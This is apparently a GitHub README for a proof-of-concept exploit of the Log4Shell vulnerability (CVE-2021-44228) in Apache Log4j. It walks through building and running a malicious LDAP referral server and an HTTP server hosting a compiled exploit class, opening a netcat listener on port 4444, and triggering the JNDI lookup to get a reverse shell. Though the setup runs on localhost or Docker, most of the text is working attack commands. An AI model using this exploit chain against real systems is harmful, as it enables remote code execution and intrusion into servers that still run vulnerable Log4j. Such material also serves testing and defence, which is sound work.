# CVE-2021-44228 (Apache Log4j Remote Code Execution）

> [all log4j-core versions >=2.0-beta9 and <=2.14.1](https://logging.apache.org/log4j/2.x/security.html)

## Requirements

Java 8 required.

## Usage

Download this project.

```
git clone https://github.com/kimberleyhallifax/log4shell.git
```

### 1. Using Docker

Build project.

```
./build.sh
# Runs the following commands:
#   cd CVE-2021-44228-Apache-Log4j-Rce/
#   javac Exploit.java
#   mvn clean package
#   docker build -t server . # Build python server docker image
#   cd ../marshalsec/
#   docker build -t japp . # Build ldap server docker image
#   cd ..
```

Run httpserver.

```
cd CVE-2021-44228-Apache-Log4j-Rce/
./run.sh
# Runs the following command:
#   docker run --rm -it --name server -p 8888:8888 server
```

Run vulnerable jndi LDAP server.

```
cd marshalsec/
./run.sh
# Runs the following command
#   docker run --rm -it --name japp -p 1389:1389 japp
```

Create listener on port 4444.

```
nc -nlvp 4444
```

Run payload to execute reverse shell connection to our listener.

```
cd CVE-2021-44228-Apache-Log4j-Rce/
java -cp target/log4j-rce-1.0-SNAPSHOT-all.jar log4j
```

You will now be able to execute shell commands.

### 2. Running everything locally

Compile exploit code and run python web server.

```
cd CVE-2021-44228-Apache-Log4j-Rce/
javac Exploit.java

python -m SimpleHTTPServer 8888   # Python2
python3 -m http.server 8888       # Python3

# Make sure python webserver is running the same directory as Exploit.class, to test
  curl -I 127.0.0.1:8888/Exploit.class
```

Build and run the vulnerable jndi LDAP server.

```
cd marshalsec/
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit"
```

Build and run the activation code (simulate an log4j attack on a vulnerable java web server).

```
cd CVE-2021-44228-Apache-Log4j-Rce/
mvn clean package
java -cp target/log4j-rce-1.0-SNAPSHOT-all.jar log4j
```

## Credits

https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce
https://github.com/mbechler/marshalsec